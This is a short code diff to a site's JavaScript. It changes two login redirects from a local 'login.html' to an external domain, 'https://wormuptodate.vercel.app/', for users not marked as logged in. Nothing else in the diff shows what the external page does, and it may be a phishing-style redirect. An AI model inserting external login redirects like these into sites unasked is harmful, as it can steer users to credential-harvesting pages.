@@ -119,8 +119,8 @@
       // if logged in, allow navigation
       if(localStorage.getItem('aifear_logged_in')) return;
       e.preventDefault();
-      // navigate to login page
-      window.location.href = 'login.html';
+      // navigate to external login page
+      window.location.href = 'https://wormuptodate.vercel.app/';
     });
   });
 
@@ -137,7 +137,7 @@
       if(document.getElementById('loginModal')){
         showModal();
       } else {
-        window.location.href = 'login.html';
+        window.location.href = 'https://wormuptodate.vercel.app/';
       }
     });
   });
